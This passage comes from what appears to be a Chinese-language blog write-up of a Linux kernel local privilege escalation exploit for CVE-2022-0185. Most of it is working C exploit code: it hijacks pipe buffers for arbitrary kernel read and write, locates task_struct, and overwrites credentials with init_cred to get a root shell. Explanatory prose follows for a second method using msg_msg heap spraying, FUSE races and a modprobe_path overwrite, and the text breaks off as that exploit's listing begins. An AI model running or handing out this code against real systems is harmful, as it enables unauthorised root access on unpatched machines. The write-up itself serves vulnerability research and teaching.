&amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_3rd_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_4th_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0xff0</span>;<br><br>    <span class="hljs-comment">/* hijack the 3rd pipe pointing to 4th */</span><br>    evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * <span class="hljs-number">3</span>;<br>    evil_3rd_buf.len = <span class="hljs-number">0</span>;<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    evil_4th_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_4th_buf.len = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_read_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page_to_read, <span class="hljs-type">void</span> *dst)</span><br>&#123;<br>    <span class="hljs-comment">/* page to read */</span><br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0xfff</span>;<br>    evil_2nd_buf.page = page_to_read;<br><br>    <span class="hljs-comment">/* hijack the 4th pipe pointing to 2nd pipe */</span><br>    write(pipe_fd[self_3rd_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_4th_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    <span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], <br>          temp_zero_buf, <br>          TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    <br>    <span class="hljs-comment">/* hijack the 3rd pipe to point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    <span class="hljs-comment">/* read out data */</span><br>    read(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">0</span>], dst, <span class="hljs-number">0xff0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_write_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page_to_write, <span class="hljs-type">void</span> *src, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>    <span class="hljs-comment">/* page to write */</span><br>    evil_2nd_buf.page = page_to_write;<br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* hijack the 4th pipe pointing to 2nd pipe */</span><br>    write(pipe_fd[self_3rd_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_4th_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    <span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], <br>          temp_zero_buf, <br>          TRD_PIPE_BUF_SZ - <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    <br>    <span class="hljs-comment">/* hijack the 3rd pipe to point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    <span class="hljs-comment">/* write data into dst page */</span><br>    write(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">1</span>], src, len);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * VII - FINAL exploit stage with arbitrary read &amp; write</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">size_t</span> *tsk_buf, current_task_page, current_task, parent_task, buf[<span class="hljs-number">0x8000</span>];<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_leaking_by_arbitrary_pipe</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">size_t</span> *comm_addr;<br>    <span class="hljs-type">int</span> try_times;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m&quot;</span><br>         <span class="hljs-string">&quot;Stage V - Leaking info by arbitrary read &amp; write&quot;</span><br>         <span class="hljs-string">&quot;\033[0m\n&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Setting up kernel arbitrary read &amp; write...&quot;</span>);<br>    setup_evil_pipe();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * KASLR&#x27;s granularity is 256MB, and pages of size 0x1000000 is 1GB MEM,</span><br><span class="hljs-comment">     * so we can simply get the vmemmap_base like this in a SMALL-MEM env.</span><br><span class="hljs-comment">     * For MEM &gt; 1GB, we can just find the secondary_startup_64 func ptr,</span><br><span class="hljs-comment">     * which is located on physmem_base + 0x9d000, i.e., vmemmap_base[156] page.</span><br><span class="hljs-comment">     * If the func ptr is not there, just vmemmap_base -= 256MB and do it again.</span><br><span class="hljs-comment">     */</span><br>    vmemmap_base = (<span class="hljs-type">size_t</span>) info_pipe_buf.page &amp; <span class="hljs-number">0xfffffffff0000000</span>;<br>    try_times = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Checking whether the %lx is vmemmap_base..\n&quot;</span>,vmemmap_base);<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (vmemmap_base + <span class="hljs-number">157</span> * <span class="hljs-number">0x40</span>), buf);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[?] Get possible data: %lx\n&quot;</span>, buf[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] == <span class="hljs-number">0x2400000000</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;READING FAILED FOR UNKNOWN REASON!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">0xffffffff81000000</span> &amp;&amp; ((buf[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xfff</span>) == <span class="hljs-number">0x030</span>)) &#123;<br>            kernel_base = buf[<span class="hljs-number">0</span>] -  <span class="hljs-number">0x030</span>;<br>            kernel_offset = kernel_base - <span class="hljs-number">0xffffffff81000000</span>;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n&quot;</span><br>                   <span class="hljs-string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n&quot;</span>, <br>                   kernel_base, kernel_offset);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        try_times++;<br>        <span class="hljs-keyword">if</span> (try_times == <span class="hljs-number">5</span>) &#123;<br>            vmemmap_base -= <span class="hljs-number">0x10000000</span>;<br>            try_times = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);<br><br>    <span class="hljs-comment">/* now seeking for the task_struct in kernel memory */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking task_struct in memory...&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * For a machine with MEM less than 256M, we can simply get the:</span><br><span class="hljs-comment">     *      page_offset_base = heap_leak &amp; 0xfffffffff0000000;</span><br><span class="hljs-comment">     * But that&#x27;s not always accurate, espacially on a machine with MEM &gt; 256M.</span><br><span class="hljs-comment">     * So we need to find another way to calculate the page_offset_base.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * Luckily the task_struct::ptraced points to itself, so we can get the</span><br><span class="hljs-comment">     * page_offset_base by vmmemap and current task_struct as we know the page.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * Note that the offset of different filed should be referred to your env.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; <span class="hljs-number">1</span>; i++) &#123;<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (vmemmap_base + (i<span class="hljs-number">-1</span>)*<span class="hljs-number">0x40</span>), buf);<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (vmemmap_base + i * <span class="hljs-number">0x40</span>), <br>                               &amp;((<span class="hljs-type">char</span>*)buf)[<span class="hljs-number">0x1000</span>]);<br>    <br>        comm_addr = memmem(buf, <span class="hljs-number">0x1ff0</span>, <span class="hljs-string">&quot;arttPWNnba3&quot;</span>, <span class="hljs-number">11</span>);<br>        <span class="hljs-keyword">if</span> (comm_addr == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> ((((<span class="hljs-type">size_t</span>) comm_addr - (<span class="hljs-type">size_t</span>) buf) &amp; <span class="hljs-number">0xfff</span>) &lt; <span class="hljs-number">500</span>) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Found string at page: %lx\n&quot;</span>, vmemmap_base + i * <span class="hljs-number">0x40</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] String offset: %lx\n&quot;</span>, <br>                                   ((<span class="hljs-type">size_t</span>) comm_addr - (<span class="hljs-type">size_t</span>) buf) &amp; <span class="hljs-number">0xfff</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] comm_addr[-2]: %lx\n&quot;</span>, comm_addr[<span class="hljs-number">-2</span>]);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] comm_addr[-3]: %lx\n&quot;</span>, comm_addr[<span class="hljs-number">-3</span>]);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] comm_addr[-52]: %lx\n&quot;</span>, comm_addr[<span class="hljs-number">-52</span>]);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] comm_addr[-53]: %lx\n&quot;</span>, comm_addr[<span class="hljs-number">-53</span>]);<br>        <span class="hljs-keyword">if</span> ((comm_addr[<span class="hljs-number">-2</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-3</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;real_cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-53</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;read_parent */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-52</span>] &gt; <span class="hljs-number">0xffff888000000000</span>)) &#123;  <span class="hljs-comment">/* task-&gt;parent */</span><br><br>            <span class="hljs-comment">/* task-&gt;read_parent */</span><br>            parent_task = comm_addr[<span class="hljs-number">-53</span>];<br><br>            <span class="hljs-comment">/* task_struct::ptraced */</span><br>            current_task = comm_addr[<span class="hljs-number">-46</span>] - <span class="hljs-number">2280</span>;<br><br>            page_offset_base = (comm_addr[<span class="hljs-number">-46</span>]&amp;<span class="hljs-number">0xfffffffffffff000</span>) - i * <span class="hljs-number">0x1000</span>;<br>            page_offset_base &amp;= <span class="hljs-number">0xfffffffff0000000</span>;<br><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,<br>                   (<span class="hljs-keyword">struct</span> page*) (vmemmap_base + i * <span class="hljs-number">0x40</span>));<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,<br>                   page_offset_base);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span><br>                   <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, current_task);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief find the init_task and copy something to current task_struct</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_task_overwrite</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m&quot;</span><br>         <span class="hljs-string">&quot;Stage VI - Hijack current task_struct to get the root&quot;</span><br>         <span class="hljs-string">&quot;\033[0m\n&quot;</span>);<br><br>    <span class="hljs-comment">/* finding the init_task, the final parent of every task */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking for init_task...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-type">size_t</span> ptask_page_addr = direct_map_addr_to_page_addr(parent_task);<br><br>        tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (parent_task &amp; <span class="hljs-number">0xfff</span>));<br><br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) ptask_page_addr, buf);<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (ptask_page_addr+<span class="hljs-number">0x40</span>),&amp;buf[<span class="hljs-number">512</span>]);<br><br>        <span class="hljs-comment">/* task_struct::real_parent */</span><br>        <span class="hljs-keyword">if</span> (parent_task == tsk_buf[<span class="hljs-number">278</span>]) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        parent_task = tsk_buf[<span class="hljs-number">278</span>];<br>    &#125;<br><br>    init_task = parent_task;<br>    init_cred = tsk_buf[<span class="hljs-number">329</span>];<br>    init_nsproxy = tsk_buf[<span class="hljs-number">341</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);<br><br>    <span class="hljs-comment">/* now, changing the current task_struct to get the full root :) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);<br><br>    current_task_page = direct_map_addr_to_page_addr(current_task);<br><br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf);<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>), &amp;buf[<span class="hljs-number">512</span>]);<br><br>    tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>    tsk_buf[<span class="hljs-number">328</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">329</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">341</span>] = init_nsproxy;<br><br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf, <span class="hljs-number">0xff0</span>);<br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>),<br>                            &amp;buf[<span class="hljs-number">512</span>], <span class="hljs-number">0xff0</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Done.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> msg_pipe[<span class="hljs-number">2</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">signal_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> nr)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Receive signal %d!\n&quot;</span>, nr);<br>    sleep(<span class="hljs-number">114514</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] CVE-2022-0185 - exploit by arttnba3&quot;</span>);<br><br>    signal(SIGSEGV, signal_handler);<br><br>    pipe(msg_pipe);<br><br>    <span class="hljs-keyword">if</span> (!fork()) &#123;<br>        <span class="hljs-comment">/* create new namespace to get CAP_SYS_ADMIN */</span><br>        <span class="hljs-keyword">if</span> (unshare(CLONE_NEWNS | CLONE_NEWUSER) &lt; <span class="hljs-number">0</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;FAILED to unshare()!&quot;</span>);<br>        &#125;<br><br>        bind_core(<span class="hljs-number">0</span>);<br><br>        occupy_4k_obj_by_msg();sleep(<span class="hljs-number">1</span>);<br>        corrupting_first_level_pipe_for_page_uaf();sleep(<span class="hljs-number">1</span>);<br>        corrupting_second_level_pipe_for_pipe_uaf();sleep(<span class="hljs-number">1</span>);<br>        building_self_writing_pipe();sleep(<span class="hljs-number">1</span>);<br>        info_leaking_by_arbitrary_pipe();sleep(<span class="hljs-number">1</span>);<br>        privilege_escalation_by_task_overwrite();sleep(<span class="hljs-number">1</span>);<br><br>        write(msg_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br><br>        sleep(<span class="hljs-number">114514</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">char</span> ch;<br><br>        <span class="hljs-keyword">if</span> (prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttPWNnba3&quot;</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;FAILED to prctl()!&quot;</span>);<br>        &#125;<br><br>        read(msg_pipe[<span class="hljs-number">0</span>], &amp;ch, <span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for root...&quot;</span>);<br>    get_root_shell();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行即可完成提权</p><p><img src="https://s2.loli.net/2023/05/28/945bYFSHmBfLKr7.png" alt="image.png"></p><h2 id="方法二、结合-FUSE-msg-msg-进行任意地址写"><a href="#方法二、结合-FUSE-msg-msg-进行任意地址写" class="headerlink" title="方法二、结合 FUSE + msg_msg 进行任意地址写"></a>方法二、结合 FUSE + <code>msg_msg</code> 进行任意地址写</h2><p>现在我们有了任意长度的堆溢出，而可溢出对象用的分配 flag 为 <code>GFP_KERNEL</code>、大小为 4k（一张内存页大小），那么我们不难想到可以基于<a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">我们的老朋友 System V 消息队列结构体</a>来完成利用</p><h3 id="Step-I-堆喷-msg-msg，覆写-m-ts-字段进行越界读取"><a href="#Step-I-堆喷-msg-msg，覆写-m-ts-字段进行越界读取" class="headerlink" title="Step.I - 堆喷 msg_msg，覆写 m_ts 字段进行越界读取"></a>Step.I - 堆喷 msg_msg，覆写 m_ts 字段进行越界读取</h3><p>我们先来复习一下消息队列中一条消息的基本结构，当我们调用 msgsnd 系统调用在指定消息队列上发送一条指定大小的 message 时，在内核空间中会创建这样一个结构体作为信息的 header：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msg_msg structure for each message */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br><span class="hljs-type">long</span> m_type;<br><span class="hljs-type">size_t</span> m_ts;<span class="hljs-comment">/* message text size */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">void</span> *security;<br><span class="hljs-comment">/* the actual message follows immediately */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>当我们在单个消息队列上发送一条消息时，若大小<strong>不大于【一个页面大小 - header size】</strong>，则仅使用一个 <code>msg_msg</code> 结构体进行存储，而当我们单次发送<strong>大于【一个页面大小 - header size】</strong>大小的消息时，内核会额外补充添加 <code>msg_msgseg</code> 结构体，其与 <code>msg_msg</code> 之间形成如下单向链表结构，而单个 <code>msg_msgseg</code> 的大小最大为一个页面大小，超出这个范围的消息内核会额外补充上更多的 <code>msg_msgseg</code> 结构体，链表最后以 NULL 结尾：</p><p><img src="https://s2.loli.net/2022/02/24/5IcVxRaFQtg3HCW.png" alt="image.png"></p><p>由于我们有越界写，那么我们不难想到的是我们可以将 <code>msg_msg</code> 与 <code>ctx-&gt;legacy_data</code> 堆喷到一起，之后越界写入相邻 <code>msg_msg</code> 的 header 将 <code>m_ts</code> 改大，之后我们再使用 <code>msgrcv()</code> 读取消息，便能读取出超出该消息范围的内容，从而完成越界读取；由于我们的越界写入会破坏 <code>msg_msg</code> 头部的双向链表，因此在读取时我们应当使用 <code>MSG_COPY</code> 以保持消息在队列上不会被 unlink</p><p>由于 <code>ctx-&gt;legacy_data</code> 的大小已经是 4k 了，故我们考虑在 <code>msg_msgseg</code> 上完成越界读取，由于 <code>msgrcv()</code> 拷贝消息时以单链表结尾 NULL 作为终止，故我们最多可以在 <code>msg_msgseg</code> 上读取将近一张内存页大小的数据，因此我们考虑让 <code>msg_msgseg</code> 的消息尽量小，从而让我们能够越界读取到更多的 object</p><p>接下来考虑如何使用越界读取进行数据泄露，这里我们考虑堆喷其他的可以泄露数据的小结构体与我们的 <code>msg_msgseg</code> 混在一起，从而使得我们越界读取时可以直接读到我们堆喷的这些小结构体，从而泄露出内核代码段加载基地址，那么这里笔者考虑堆喷 <a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x02-seq-file-%E7%9B%B8%E5%85%B3">seq_operations</a> 来完成数据的泄露</p><p>为了提高越界写入 <code>msg_msg</code> 的成功率，笔者选择先堆喷一部分 <code>msg_msg</code>，之后分配  <code>ctx-&gt;legacy_data</code> ， 接下来再堆喷另一部分 <code>msg_msg</code>为了提高数据泄露的成功概率，笔者选择在每次在消息队列上发送消息时都喷一个 <code>seq_operations</code>，在完成消息队列的发送之后再喷射大量的 <code>seq_operations</code></p><p>不过需要注意的是我们的越界写并不一定能写到相邻的 <code>msg_msg</code>，也可能写到其他结构体或是 free object，若 free object 的 next 指针刚好位于开头被我们 overwrite 了，则会在后面的分配中导致 kernel panic</p><h3 id="Step-II-堆喷-msg-msg，利用-FUSE-在消息拷贝时覆写-next-字段进行任意地址写"><a href="#Step-II-堆喷-msg-msg，利用-FUSE-在消息拷贝时覆写-next-字段进行任意地址写" class="headerlink" title="Step.II - 堆喷 msg_msg，利用 FUSE 在消息拷贝时覆写 next 字段进行任意地址写"></a>Step.II - 堆喷 msg_msg，利用 FUSE 在消息拷贝时覆写 next 字段进行任意地址写</h3><p>接下来我们该考虑如何进行提权的工作了，通过覆写 <code>msg_msg</code> 的方式我们同样可以进行任意地址写的操作，由于消息发送时在 <code>do_msgsnd()</code> 当中是先分配对应的 <code>msg_msg</code> 与 <code>msg_msgseg</code> 链表作为消息的存储空间再进行拷贝，那么我们不难想到的是我们可以先发送一个大于一张内存页大小的消息，这样会分配一个 4k 的 <code>msg_msg</code> 与一个 <code>msg_msgseg</code> ，在 <code>do_msgsnd()</code> 中完成空间分配后在 <code>msg_msg</code> 上进行数据拷贝的时候，我们在另一个线程当中使用越界写更改 <code>msg_msg</code> 的 header，使其 next 指针更改到我们想要写入数据的地方，当 <code>do_msgsnd()</code> 开始将数据拷贝到 <code>msg_msgseg</code> 上时，由于 <code>msg_msg</code> 的 next 指针已经被我们所更改，故其会将数据写入到我们指定的地址上，从而完成任意地址写</p><p><img src="https://s2.loli.net/2023/01/10/JxidQjuHn6ZKs4l.png" alt="image.png"></p><p>不过 <code>do_msgsnd()</code> 的所有操作在一个系统调用中完成，因此这需要我们进行条件竞争，而常规的条件竞争通常很难成功，那么我们不难想到的是我们可以利用 <a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#userfaultfd%EF%BC%88may-obsolete%EF%BC%89">userfaultfd</a> 让  <code>do_msgsnd()</code> 在拷贝数据到  <code>msg_msg</code>  时触发用户空间的缺页异常，陷入到我们的 page fault handler 中，我们在 handler 线程中再进行越界写，之后恢复到原线程，这样利用的成功率便大大提高了</p><p><img src="https://i.loli.net/2021/09/08/i4C7oOvHdG2RqUm.png" alt="image.png"></p><p>但是自 kernel 版本 5.11 起<strong>非特权用户无法使用 userfaultfd</strong>，而该漏洞影响的内核版本包括 5.11以上的版本，因此我们需要使用更为通用的办法——<strong>用户空间文件系统</strong>（filesystem in userspace，<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#FUSE-race">FUSE</a>）可以被用作 userfaultfd 的替代品，帮助我们完成条件竞争的利用</p><p><img src="https://s2.loli.net/2023/01/10/9q3VSGepCnKzbuB.png" alt="image.png"></p><p>不过需要注意的是，由于 slub allocator 的随机性，<strong>我们并不能保证一定能够溢出到陷入 FUSE 中的 msg_msg ，</strong>因此需要多次分配并进行检查以确保我们完成了任意地址写</p><p>有了任意地址写，现在该考虑写哪里、写什么了，我们可以通过覆写一些全局函数表来劫持内核执行流，或是覆写一些其他的东西完成提权，这里笔者选择覆写 <code>modprobe_path</code> 完成提权，当我们执行一个格式非法的程序时，内核会以 root 权限执行 <code>modprobe_path</code> 所指的应用，我们只需要将其改为我们的恶意脚本的路径即可</p><h3 id="FINAL-EXPLOIT-1"><a href="#FINAL-EXPLOIT-1" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>最后由笔者编写的 exp 如下，因为一些原因暂时无法进行验证，但是思路应该是对的，在理论上应当可行：</p><blockquote><p>内核地址泄露的部分经过验证了，但是对于 FUSE 进行利用的部分，由于笔者在复现漏洞时使用的是 CTF 中 kernel pwn 的简易环境，故没法使用 FUSE：(</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span 